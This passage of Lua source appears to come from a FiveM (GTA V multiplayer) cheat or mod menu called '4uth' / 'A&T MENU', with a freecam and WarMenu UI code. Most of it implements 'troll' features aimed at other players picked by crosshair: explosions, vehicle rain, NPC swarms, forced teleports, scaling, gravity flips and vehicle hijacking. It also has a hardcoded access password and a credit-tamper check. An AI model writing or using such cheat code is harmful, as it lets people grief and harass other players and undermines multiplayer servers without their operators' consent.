                            SetEntityCoords(playerPed, teleportMarkerCoords.x, teleportMarkerCoords.y, teleportMarkerCoords.z, false, false, false, false)
                        end
                    end
                    teleportMarkerCoords = nil
                end
            elseif features[current_feature] == "Delete Entity" then
            print("[MENU][4uth] Delete")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
                if IsDisabledControlJustPressed(0, 24) and hit and entity_hit ~= 0 then
                    if DoesEntityExist(entity_hit) then
                        SetEntityAsMissionEntity(entity_hit, true, true)
                        DeleteEntity(entity_hit)
                    end
                end
            elseif features[current_feature] == "Vehicule Hijack" then
            print("[MENU][4uth] Vehicule Hijack")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 128, 0, 255)
                if IsDisabledControlJustPressed(0, 24) and hit and entity_hit ~= 0 and IsEntityAVehicle(entity_hit) then
                    local vehicle = entity_hit
                    if DoesEntityExist(vehicle) and IsVehicleSeatFree(vehicle, -1) then
                        local pedModel = GetHashKey("a_m_m_skater_01")
                        RequestModel(pedModel)
                        local timeout = GetGameTimer() + 5000
                        while not HasModelLoaded(pedModel) and GetGameTimer() < timeout do Wait(0) end
                        if HasModelLoaded(pedModel) then
                            local vehPos = GetEntityCoords(vehicle)
                            local vehHeading = GetEntityHeading(vehicle)
                            local hijackPed = CreatePed(26, pedModel, vehPos.x, vehPos.y, vehPos.z, vehHeading, false, true)
                            SetEntityAsMissionEntity(hijackPed, true, true)
                            SetPedIntoVehicle(hijackPed, vehicle, -1)
                            SetModelAsNoLongerNeeded(pedModel)
                            -- Make ped drive away (wander task, client-side only)
                            TaskVehicleDriveWander(hijackPed, vehicle, 25.0, 786603)
                            SetEntityAsNoLongerNeeded(hijackPed)
                            SetEntityAsNoLongerNeeded(vehicle)
                        end
                    end
                end
            elseif features[current_feature] == "Vehicle Spawner" then
            print("[MENU][4uth] Vehicle Spawner")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 255, 255)
                if not _G._vehSpawnerModel then _G._vehSpawnerModel = "t20" end
                if IsDisabledControlJustPressed(0, 24) then
                    local inputModel = _G._vehSpawnerModel
                    local vehicleModel = GetHashKey(inputModel)
                    RequestModel(vehicleModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(vehicleModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(vehicleModel) then
                        local camCoords = GetCamCoord(cam)
                        local direction = RotationToDirection(GetCamRot(cam))
                        local spawnCoords
                        if hit == 1 then
                            spawnCoords = end_coords
                        else
                            spawnCoords = camCoords + direction * 8.0
                        end
                        -- Find ground Z for spawn position
                        local found, groundZ = GetGroundZFor_3dCoord(spawnCoords.x, spawnCoords.y, spawnCoords.z + 10.0, 0)
                        if found then
                            spawnCoords = vector3(spawnCoords.x, spawnCoords.y, groundZ + 0.5)
                        end
                        -- Heading: face in camera direction
                        local heading = GetCamRot(cam).z
                        local vehicle = CreateVehicle(vehicleModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                        SetEntityAsMissionEntity(vehicle, true, true)
                        SetVehicleOnGroundProperly(vehicle)
                        SetModelAsNoLongerNeeded(vehicleModel)
                        _G._vehSpawnerModel = inputModel
                        print("[INFO][4uth] Vehicle spawned")
                    else
                        print("[WARN][4uth] Vehicle load fail")
                    end
                end
            elseif features[current_feature] == "Shoot Vehicle" then
            print("[MENU][4uth] Shoot Vehicle")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
                if IsDisabledControlJustPressed(0, 24) then
                    local vehicleModel = GetHashKey("t20")
                    RequestModel(vehicleModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(vehicleModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(vehicleModel) then
                        local camCoords = GetCamCoord(cam)
                        local direction = RotationToDirection(GetCamRot(cam))
                        -- Always spawn in front of camera, even if pointing in the air
                        local spawnCoords = camCoords + direction * 8.0
                        -- No ground check: allow air spawns
                        local heading = GetCamRot(cam).z
                        local vehicle = CreateVehicle(vehicleModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                        SetEntityAsMissionEntity(vehicle, true, true)
                        -- Apply force to the vehicle to move it towards the crosshair
                        local forceDirection = direction * 500.0
                        ApplyForceToEntity(vehicle, 1, forceDirection.x, forceDirection.y, forceDirection.z, 0, 0, 0, 0, false, true, true, false, true)
                        SetModelAsNoLongerNeeded(vehicleModel)
                        print("[INFO][4uth] Vehicle shot")
                    else
                        print("[WARN][4uth] Vehicle load fail")
                    end
                end
            elseif features[current_feature] == "Map Destroyer" then
            print("[MENU][4uth] Map Destroyer")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 255, 255)
                -- Removed display text for map destroyer ramp type
                if IsDisabledControlJustPressed(0, 24) then
                    local pos = coords + direction * 10.0
                    local objHash = GetHashKey(mapDestroyerRamps[currentRampType].model)
                    RequestModel(objHash)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(objHash) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(objHash) then
                        local ramp = CreateObject(objHash, pos.x, pos.y, pos.z, true, false, true)
                        SetEntityHeading(ramp, rot.z)
                        SetEntityAsMissionEntity(ramp, true, true)
                        FreezeEntityPosition(ramp, true)
                        SetModelAsNoLongerNeeded(objHash)
                        SetEntityCollision(ramp, true, true)
                        table.insert(placedRamps, ramp)
                    end
                end
                if IsDisabledControlJustPressed(0, 73) then
                    for _, ramp in ipairs(placedRamps) do
                        if DoesEntityExist(ramp) then
                            SetEntityAsMissionEntity(ramp, true, true)
                            DeleteEntity(ramp)
                        end
                    end
                    placedRamps = {}
                end
            end
            
            
            -- === TROLL FEATURES ===
        -- Launch Player feature removed as requested
        -- ...existing code...
        elseif features[current_feature] == "Attach Object" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local objName = funnyObjects[math.random(#funnyObjects)]
                    local model = GetHashKey(objName)
                    RequestModel(model)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(model) then
                        local obj = CreateObject(model, 0, 0, 0, true, false, true)
                        AttachEntityToEntity(obj, targetPed, GetPedBoneIndex(targetPed, 0x796e), 0.0, 0.0, 0.5, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        SetEntityAsMissionEntity(obj, true, true)
                        SetModelAsNoLongerNeeded(model)
                    end
                end
            end
        elseif features[current_feature] == "Explode Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    AddExplosion(pos.x, pos.y, pos.z, 6, 10.0, true, false, 1.0)
                end
            end
        elseif features[current_feature] == "Change Player Model" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 0, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed, targetId = GetClosestPlayerToCrosshair(coords, direction)
                if targetPed and targetId then
                    local modelName = funnyModels[math.random(#funnyModels)]
                    local model = GetHashKey(modelName)
                    RequestModel(model)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(model) then
                        -- Only allow changing local player model (for safety)
                        if targetPed == PlayerPedId() then
                            SetPlayerModel(PlayerId(), model)
                            SetModelAsNoLongerNeeded(model)
                        else
                            print("[WARN][4uth] Only self")
                        end
                    end
                end
            end
        elseif features[current_feature] == "Vehicle Rain" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 128, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    for i = 1, 10 do
                        local model = GetHashKey("adder")
                        RequestModel(model)
                        local timeout = GetGameTimer() + 5000
                        while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, pos.x + math.random(-5,5), pos.y + math.random(-5,5), pos.z + 20 + i*2, 0.0, true, false)
                            SetEntityAsMissionEntity(veh, true, true)
                            SetModelAsNoLongerNeeded(model)
                        end
                    end
                end
            end
        elseif features[current_feature] == "Slippery Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    StartParticleFxLoopedAtCoord("scr_tn_trailer_sparks", pos.x, pos.y, pos.z-1, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
                    SetEntityMaxSpeed(targetPed, 100.0)
                    SetPedMoveRateOverride(targetPed, 10.0)
                end
            end
        elseif features[current_feature] == "Shrink Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 255, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    if not originalScales[targetPed] then
                        originalScales[targetPed] = GetEntityScale(targetPed)
                    end
                    SetEntityScale(targetPed, 0.5, 0.5, 0.5, false)
                end
            end
        elseif features[current_feature] == "Grow Player" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    if not originalScales[targetPed] then
                        originalScales[targetPed] = GetEntityScale(targetPed)
                    end
                    SetEntityScale(targetPed, 2.0, 2.0, 2.0, false)
                end
            end
        elseif features[current_feature] == "Random Teleport" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetRandomPosition()
                    SetEntityCoords(targetPed, pos.x, pos.y, pos.z, false, false, false, false)
                end
            end
        elseif features[current_feature] == "Sound Spam" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    local snd = funnySounds[math.random(#funnySounds)]
                    PlaySoundFromCoord(-1, snd.name, pos.x, pos.y, pos.z, snd.dict, false, 0, false)
                end
            end
        elseif features[current_feature] == "Gravity Flip" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 255, 255, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    if not gravityFlipped[targetPed] then
                        gravityFlipped[targetPed] = true
                        SetEntityGravity(targetPed, false)
                        ApplyForceToEntity(targetPed, 1, 0, 0, 1000.0, 0, 0, 0, 0, false, true, true, false, true)
                    else
                        gravityFlipped[targetPed] = nil
                        SetEntityGravity(targetPed, true)
                    end
                end
            end
        elseif features[current_feature] == "Invisible Vehicle" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 128, 128, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed and IsPedInAnyVehicle(targetPed, false) then
                    local veh = GetVehiclePedIsIn(targetPed, false)
                    SetEntityAlpha(veh, 50, false)
                end
            end
        elseif features[current_feature] == "NPC Swarm" then
            draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 128, 255)
            if IsDisabledControlJustPressed(0, 24) then
                local targetPed = select(1, GetClosestPlayerToCrosshair(coords, direction))
                if targetPed then
                    local pos = GetEntityCoords(targetPed)
                    for i = 1, 5 do
                        local model = GetHashKey(npcModels[math.random(#npcModels)])
                        RequestModel(model)
                        local timeout = GetGameTimer() + 5000
                        while not HasModelLoaded(model) and GetGameTimer() < timeout do Wait(0) end
                        if HasModelLoaded(model) then
                            local ped = CreatePed(26, model, pos.x + math.random(-3,3), pos.y + math.random(-3,3), pos.z, 0.0, true, false)
                            SetEntityAsMissionEntity(ped, true, true)
                            SetModelAsNoLongerNeeded(model)
                        end
                    end
                end
            end
        end

        Citizen.Wait(0)
    end
end)

-- Spikestrip effect: burst tires of vehicles driving over spikestrips
Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        for i = #spikestrips, 1, -1 do
            local obj = spikestrips[i]
            if DoesEntityExist(obj) then
                local objCoords = GetEntityCoords(obj)
                local vehicles = GetGamePool("CVehicle")
                for _, veh in ipairs(vehicles) do
                    if DoesEntityExist(veh) and not IsEntityDead(veh) then
                        local vehCoords = GetEntityCoords(veh)
                        if #(vehCoords - objCoords) < 3.0 then -- within 3 meters
                            for tire = 0, 7 do
                                if not IsVehicleTyreBurst(veh, tire, false) then
                                    SetVehicleTyreBurst(veh, tire, true, 1000.0)
                                end
                            end
                        end
                    end
                end
            else
                table.remove(spikestrips, i)
            end
        end
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        if cam_active then
            -- Remove FreezeEntityPosition, allow physics
            -- Block all player movement and weapon controls (mouse, keyboard, gamepad)
            DisableAllControlActions(0) -- Block all controls for player 0
            -- Allow only freecam controls (mouse look, WASD, etc. for camera)
            EnableControlAction(0, 1, true)   -- LookLeftRight (for camera)
            EnableControlAction(0, 2, true)   -- LookUpDown (for camera)
            EnableControlAction(0, 32, true)  -- W (freecam forward)
            EnableControlAction(0, 33, true)  -- S (freecam backward)
            EnableControlAction(0, 34, true)  -- A (freecam left)
            EnableControlAction(0, 35, true)  -- D (freecam right)
            EnableControlAction(0, 20, true)  -- Z (freecam up)
            EnableControlAction(0, 36, true)  -- Left Ctrl (freecam down)
            EnableControlAction(0, 14, true)  -- Scroll up (feature next)
            EnableControlAction(0, 15, true)  -- Scroll down (feature prev)
            EnableControlAction(0, 2321, true)  -- H (toggle freecam)
            EnableControlAction(0, 44, true)  -- Q (input for spawners)
            EnableControlAction(0, 24, true)  -- Left Mouse (for spawn/shoot/vehicle)
            EnableControlAction(0, 69, true)  -- Mouse1 (vehicle fire)
            EnableControlAction(0, 70, true)  -- Vehicle Attack
            EnableControlAction(0, 71, true)  -- Vehicle Accelerate
            EnableControlAction(0, 72, true)  -- Vehicle Brake
            EnableControlAction(0, 75, true)  -- Vehicle Exit
            EnableControlAction(0, 76, true)  -- Vehicle Handbrake
            EnableControlAction(0, 86, true)  -- Vehicle Horn
            EnableControlAction(0, 59, true)  -- Vehicle Move Left/Right
            EnableControlAction(0, 60, true)  -- Vehicle Move Up/Down
            EnableControlAction(0, 63, true)  -- Vehicle Move Left
            EnableControlAction(0, 64, true)  -- Vehicle Move Right
            EnableControlAction(0, 65, true)  -- Vehicle Move Up
            EnableControlAction(0, 66, true)  -- Vehicle Move Down
            EnableControlAction(0, 67, true)  -- Vehicle Fly Left
            EnableControlAction(0, 68, true)  -- Vehicle Fly Right
            -- Only block weapon holding if not in a vehicle
            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                if GetSelectedPedWeapon(playerPed) ~= GetHashKey("weapon_unarmed") then
                    SetCurrentPedWeapon(playerPed, GetHashKey("weapon_unarmed"), true)
                end
            end
        end
        Citizen.Wait(0)
    end
end)

-- PASSWORD PROTECTION SYSTEM
local correctPasswordEntered = true
local requiredPassword = "ATSM"
local enteredPassword = ""
local passwordInputActive = false

function DisplayPasswordNotification(text)
    BeginTextCommandThefeedPost('STRING')
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandThefeedPostTicker(true, true)
end

function ResetPasswordInput()
    enteredPassword = ""
    passwordInputActive = true
end

function ShowPasswordEntryMenu()
    Citizen.CreateThread(function()
        AddTextEntry('FMMC_KEY_TIP1', 'Enter Password for A&T MENU')
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", "", "", "", "", 10)

        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end

        if UpdateOnscreenKeyboard() == 1 then
            local enteredPassword = GetOnscreenKeyboardResult()
            if enteredPassword then
                if enteredPassword == requiredPassword then
                    correctPasswordEntered = true
                    DisplayPasswordNotification("~g~Password accepted! Welcome to A&T MENU")
                    Citizen.Wait(1000)
                else
                    DisplayPasswordNotification("~r~Invalid password. Access denied.")
                    Citizen.Wait(2000)
                    ShowPasswordEntryMenu()
                end
            end
        elseif UpdateOnscreenKeyboard() == 2 then
            DisplayPasswordNotification("~r~Password entry cancelled.")
            Citizen.Wait(2000)
            ShowPasswordEntryMenu()
        end
    end)

--[[ PASSWORD PROTECTION SCREEN - DISABLED
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if not correctPasswordEntered then
            -- Draw password screen
            DrawRect(0.5, 0.5, 1.0, 1.0, 0, 0, 0, 200)
            
            -- Title
            SetTextFont(1)
            SetTextScale(1.2, 1.2)
            SetTextColour(255, 255, 255, 255)
            SetTextCentre(true)
            SetTextEntry("STRING")
            AddTextComponentString("A&T MENU - PASSWORD REQUIRED")
            DrawText(0.5, 0.25)
            
            -- Instructions
            SetTextFont(0)
            SetTextScale(0.7, 0.7)
            SetTextColour(255, 255, 255, 255)
            SetTextCentre(true)
            SetTextEntry("STRING")
            AddTextComponentString("Type the password using your keyboard:")
            DrawText(0.5, 0.35)
            
            -- Password requirement
            SetTextEntry("STRING")
            AddTextComponentString("Required: ATSM")
            DrawText(0.5, 0.4)
            
            -- Current input with cursor
            SetTextEntry("STRING")
            AddTextComponentString("Current: " .. enteredPassword .. "_")
            DrawText(0.5, 0.5)
            
            -- Instructions
            SetTextEntry("STRING")
            AddTextComponentString("Press ENTER to confirm | BACKSPACE to delete")
            DrawText(0.5, 0.6)
            
            SetTextEntry("STRING")
            AddTextComponentString("Contact: A&T SERVICES")
            DrawText(0.5, 0.7)
            
            -- Handle keyboard input
            if IsControlJustReleased(0, 34) then -- A
                enteredPassword = enteredPassword .. "A"
            elseif IsControlJustReleased(0, 245) then -- T
                enteredPassword = enteredPassword .. "T"
            elseif IsControlJustReleased(0, 8) then -- S
                enteredPassword = enteredPassword .. "S"
            elseif IsControlJustReleased(0, 244) then -- M
                enteredPassword = enteredPassword .. "M"
            elseif IsControlJustReleased(0, 177) then -- BACKSPACE
                if #enteredPassword > 0 then
                    enteredPassword = string.sub(enteredPassword, 1, #enteredPassword - 1)
                end
            elseif IsControlJustReleased(0, 18) then -- ENTER
                if enteredPassword == requiredPassword then
                    correctPasswordEntered = true
                    DisplayPasswordNotification("~g~Password accepted! Welcome to A&T MENU")
                else
                    DisplayPasswordNotification("~r~Wrong password! Try again.")
                    enteredPassword = ""
                end
            elseif IsControlJustReleased(0, 322) then -- ESC
                enteredPassword = ""
            end
        end
    end
end)
]]
end

function DisableControlsUntilPassword()
    Citizen.CreateThread(function()
        while not correctPasswordEntered do
            Citizen.Wait(0)
            DisableControlAction(0, 30, true)
            DisableControlAction(0, 31, true)
            DisableControlAction(0, 32, true)
            DisableControlAction(0, 33, true)
            DisableControlAction(0, 1, true)
            DisableControlAction(0, 2, true)
            DisableControlAction(0, 27, true)
            DisableControlAction(0, 288, true)
            DisableControlAction(0, 200, true)
        end
    end)
end
-- עדכון handling לרכב חדש כשנכנסים לרכב
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000)
        local playerPed = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        if vehicle ~= 0 and isEasyHandlingEnabled then
            ApplyHandling(vehicle, handlingLevel, true)
        end
    end
end)



function BeginTextCommandDisplayText(text)return Citizen.InvokeNative(0x25FBB336DF1804CB, text) end function AddTextComponentSubstringPlayerName(text)return Citizen.InvokeNative(0x6C188BE134E074AA, text)end function EndTextCommandDisplayText(x, y)return Citizen.InvokeNative(0xCD015E5BB0D96A57, x, y)end WarMenu = {} WarMenu.debug = false local menus = {} local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202} local optionCount = 0 local currentKey = nil local currentMenu = nil local titleHeight = 0.11 local titleXOffset = 0.5 local titleSpacing = 2 local titleYOffset = 0.03 local titleScale = 1.0 local buttonHeight = 0.038 local buttonFont = 0 local buttonScale = 0.365 local buttonTextXOffset = 0.005 local buttonTextYOffset = 0.005 local function debugPrint(text) if WarMenu.debug then Citizen.Trace('[WarMenu] ' .. tostring(text)) end end local function setMenuProperty(id, property, value) if id and menus[id] then menus[id][property] = value debugPrint(id .. ' menu property changed: { ' .. tostring(property) .. ', ' .. tostring(value) .. ' }') end end local function isMenuVisible(id) if id and menus[id] then return menus[id].visible else return false end end local function setMenuVisible(id, visible, holdCurrent) if id and menus[id] then setMenuProperty(id, 'visible', visible) if not holdCurrent and menus[id] then setMenuProperty(id, 'currentOption', 1) end if visible then if id ~= currentMenu and isMenuVisible(currentMenu) then setMenuVisible(currentMenu, false) end currentMenu = id end end end local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)SetTextColour(color.r, color.g, color.b, color.a)SetTextFont(font)SetTextScale(scale, scale) if shadow then SetTextDropShadow(2, 2, 0, 0, 0) end if menus[currentMenu] then if center then SetTextCentre(center) elseif alignRight then SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)SetTextRightJustify(true) end end BeginTextCommandDisplayText("STRING")AddTextComponentSubstringPlayerName(text)EndTextCommandDisplayText(x, y) end local function drawRect(x, y, width, height, color)DrawRect(x, y, width, height, color.r, color.g, color.b, color.a) end local function drawTitle() if menus[currentMenu] then local x = menus[currentMenu].x + menus[currentMenu].width / 2 local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing if menus[currentMenu].titleBackgroundSprite then DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255) else drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor) end drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true) end end local function drawSubTitle() if menus[currentMenu] then local x = menus[currentMenu].x + menus[currentMenu].width / 2 local y = menus[currentMenu].y + titleHeight + buttonHeight / 2 local subTitleColor = {r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255}drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false) if optionCount > menus[currentMenu].maxOptionCount then drawText(tostring(menus[currentMenu].currentOption) .. ' / ' .. tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true) end end end local function drawButton(text, subText) local x = menus[currentMenu].x + menus[currentMenu].width / 2 local multiplier = nil if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then multiplier = optionCount elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) end if multiplier then local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2 local backgroundColor = nil local textColor = nil local subTextColor = nil local shadow = false if menus[currentMenu].currentOption == optionCount then backgroundColor = menus[currentMenu].menuFocusBackgroundColor textColor = menus[currentMenu].menuFocusTextColor subTextColor = menus[currentMenu].menuFocusTextColor else backgroundColor = menus[currentMenu].menuBackgroundColor textColor = menus[currentMenu].menuTextColor subTextColor = menus[currentMenu].menuSubTextColor shadow = true end drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) if subText then drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true) end end end function WarMenu.CreateMenu(id, title)menus[id] = {}menus[id].title = title menus[id].subTitle = 'INTERACTION MENU' menus[id].visible = false menus[id].previousMenu = nil menus[id].aboutToBeClosed = false menus[id].x = 0.0175 menus[id].y = 0.025 menus[id].width = 0.23 menus[id].currentOption = 1 menus[id].maxOptionCount = 10 menus[id].titleFont = 1 menus[id].titleColor = {r = 0, g = 0, b = 0, a = 255}menus[id].titleBackgroundColor = {r = 245, g = 127, b = 23, a = 255}menus[id].titleBackgroundSprite = nil menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}menus[id].menuFocusTextColor = {r = 0, g = 0, b = 0, a = 255}menus[id].menuFocusBackgroundColor = {r = 245, g = 245, b = 245, a = 255}menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 160}menus[id].subTitleBackgroundColor = {r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255}menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}debugPrint(tostring(id) .. ' menu created') end function WarMenu.CreateSubMenu(id, parent, subTitle) if menus[parent] then WarMenu.CreateMenu(id, menus[parent].title) if subTitle then setMenuProperty(id, 'subTitle', string.upper(subTitle)) else setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle)) end setMenuProperty(id, 'previousMenu', parent)setMenuProperty(id, 'x', menus[parent].x)setMenuProperty(id, 'y', menus[parent].y)setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)setMenuProperty(id, 'titleFont', menus[parent].titleFont)setMenuProperty(id, 'titleColor', menus[parent].titleColor)setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor) else debugPrint('Failed to create ' .. tostring(id) .. ' submenu: ' .. tostring(parent) .. ' parent menu doesn\'t exist') end end function WarMenu.CurrentMenu() return currentMenu end function WarMenu.OpenMenu(id) if id and menus[id] then PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(id, true)debugPrint(tostring(id) .. ' menu opened') else debugPrint('Failed to open ' .. tostring(id) .. ' menu: it doesn\'t exist') end end function WarMenu.IsMenuOpened(id) return isMenuVisible(id) end function WarMenu.IsAnyMenuOpened() for id, _ in pairs(menus) do if isMenuVisible(id) then return true end end return false end function WarMenu.IsMenuAboutToBeClosed() if menus[currentMenu] then return menus[currentMenu].aboutToBeClosed else return false end end function WarMenu.CloseMenu() if menus[currentMenu] then if menus[currentMenu].aboutToBeClosed then menus[currentMenu].aboutToBeClosed = false setMenuVisible(currentMenu, false)debugPrint(tostring(currentMenu) .. ' menu closed')PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)optionCount = 0 currentMenu = nil currentKey = nil else menus[currentMenu].aboutToBeClosed = true debugPrint(tostring(currentMenu) .. ' menu about to be closed') end end end function WarMenu.Button(text, subText) 
    local buttonText = text 
    if subText then 
        buttonText = '{ ' .. tostring(buttonText) .. ', ' .. tostring(subText) .. ' }' 
    end 
    
    if menus[currentMenu] then 
        optionCount = optionCount + 1 
        local isCurrent = menus[currentMenu].currentOption == optionCount 
        
        -- Add keybind text to display
        local keybindText = GetKeybindText(currentMenu, text)
        local displayText = text .. keybindText
        
        drawButton(displayText, subText) 
        
        if isCurrent then 
            -- Check for F9 key to set keybind
            if IsControlJustPressed(0, 56) then -- F9 key
                StartKeybindMode(currentMenu, text)
                return false
            end
            
            if currentKey == keys.select then 
                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                debugPrint(buttonText .. ' button pressed') 
                return true 
            elseif currentKey == keys.left or currentKey == keys.right then 
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) 
            end 
        end 
        
        -- Check if this option has a keybind and execute it
